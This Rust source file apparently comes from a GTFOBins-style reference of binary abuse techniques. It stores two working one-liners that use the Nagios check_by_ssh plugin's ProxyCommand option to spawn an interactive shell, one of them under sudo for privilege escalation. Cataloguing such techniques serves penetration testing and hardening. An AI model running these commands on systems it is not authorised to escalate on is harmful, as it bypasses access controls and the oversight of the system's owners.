
pub static BIN_NAME: &'static str = "check_by_ssh";
pub static BIN_DESC: &'static str =
    "This is the `check_by_ssh` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.";
pub static SH_DESC: &'static str = "The shell will only last 10 seconds.";
pub static SH_CODE: &'static str = r#"
    
    check_by_ssh -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H localhost -C xx
"#;
pub static SUDO_DESC: &'static str = "The shell will only last 10 seconds";
pub static SUDO_CODE: &'static str = r#"
    
    sudo check_by_ssh -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H localhost -C xx
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
